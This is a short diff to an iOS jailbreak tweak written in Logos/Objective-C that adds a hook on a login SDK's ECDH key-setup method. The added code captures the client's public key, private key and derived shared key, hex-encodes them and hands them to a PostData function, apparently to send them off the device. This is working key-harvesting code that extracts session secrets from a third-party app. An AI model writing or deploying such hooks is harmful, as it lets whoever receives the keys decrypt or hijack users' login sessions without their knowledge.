@@ -60,6 +60,31 @@ static void PostData (NSDictionary * dict) {
 %end
 
 
+
+// -[WloginSdk_v2 initECDHShareKey:andCliPubKey:andCliPubKeyLen:andCliPrivKey:andCliPrivKeyLen:wKeyVer:]:
+
+
+%hook WloginSdk_v2
+- (int)initECDHShareKey:(unsigned char *)arg2 andCliPubKey:(unsigned char *)arg3 andCliPubKeyLen:(unsigned int *)arg4 andCliPrivKey:(unsigned char *)arg5 andCliPrivKeyLen:(unsigned int *)arg6 wKeyVer:(short *)arg7 {
+	int res = %orig;
+	
+	NSMutableDictionary *mDic1 = [[NSMutableDictionary alloc] init];
+	
+	NSString * pubkey = [NSString hexStringWithBuffer: arg3 ofLength: *arg4];
+	NSString * prikey = [NSString hexStringWithBuffer: arg5 ofLength: *arg6];
+	NSString * shakey = [NSString hexStringWithBuffer: arg2 ofLength: 0x10];
+
+	[mDic1 setObject: @"ecdh" forKey:@"action"];
+	[mDic1 setObject: pubkey forKey:@"pub_key"];
+	[mDic1 setObject: prikey forKey:@"pri_key"];
+	[mDic1 setObject: shakey forKey:@"sha_key"];
+
+	PostData(mDic1);
+	return res;
+}
+
+%end
+
 /**
  * 加载插件设置
  */
